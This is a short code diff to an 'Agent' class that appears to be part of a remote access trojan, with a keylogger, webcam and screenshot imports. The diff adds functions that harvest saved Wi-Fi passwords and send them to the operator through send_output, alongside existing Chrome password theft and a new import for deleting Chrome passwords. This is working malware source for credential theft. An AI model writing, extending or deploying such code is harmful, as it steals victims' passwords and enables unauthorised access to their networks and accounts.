@@ -19,6 +19,8 @@ import getpass
 from pynput.keyboard import Key, Listener
 import cv2
 from passwords import getChromePasswords
+from passwords import getWifiPasswords
+from passwords import deleteChromePasswords
 
 if os.name == 'nt':
     from PIL import ImageGrab
@@ -327,6 +329,10 @@ class Agent(object):
         for dictionary in data:
             for key, value in dictionary.items():
                 self.send_output("%s : %s" % (key, value))
+
+        data = getWifiPasswords()
+        for wifi in data:
+            self.send_output(wifi)
 
 
     def help(self):
